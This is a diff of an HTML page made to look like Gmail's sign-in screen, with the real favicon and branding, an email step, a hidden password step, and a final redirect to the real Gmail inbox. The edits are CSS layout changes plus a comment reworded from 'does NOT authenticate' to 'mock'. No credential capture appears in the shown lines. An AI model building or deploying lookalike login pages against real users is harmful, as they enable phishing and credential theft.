@@ -5,22 +5,21 @@
   <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon">
   <title>Gmail</title>
   <style>
-    body {
+    html, body {
       margin: 0;
       padding: 0;
+      height: 100%;
       background-color: #202124;
       font-family: "Roboto", Arial, sans-serif;
       color: #e8eaed;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: space-between;
-      height: 100vh;
+      justify-content: center; /* center the container vertically */
     }
 
     .container {
       background-color: #1f1f1f;
-      margin-top: 80px;
       padding: 40px 50px;
       width: 800px;
       max-width: 90%;
@@ -28,6 +27,7 @@
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
       display: flex;
       justify-content: space-between;
+      box-sizing: border-box;
     }
 
     .left-side {
@@ -121,7 +121,6 @@
       cursor: pointer;
     }
 
-    /* Initially hide password step */
     #password-step {
       display: none;
       flex-direction: column;
@@ -131,7 +130,7 @@
       text-align: center;
       font-size: 13px;
       color: #9aa0a6;
-      margin-bottom: 20px;
+      margin-top: 20px;
     }
 
     footer a {
@@ -144,6 +143,7 @@
       .container {
         flex-direction: column;
         align-items: flex-start;
+        width: 90%;
       }
       .right-side {
         width: 100%;
@@ -230,7 +230,7 @@
         return;
       }
 
-      // Redirect to Gmail inbox (does NOT authenticate)
+      // Redirect to Gmail inbox (mock)
       window.location.href = "https://mail.google.com/mail/u/0/#inbox";
     });
   </script>
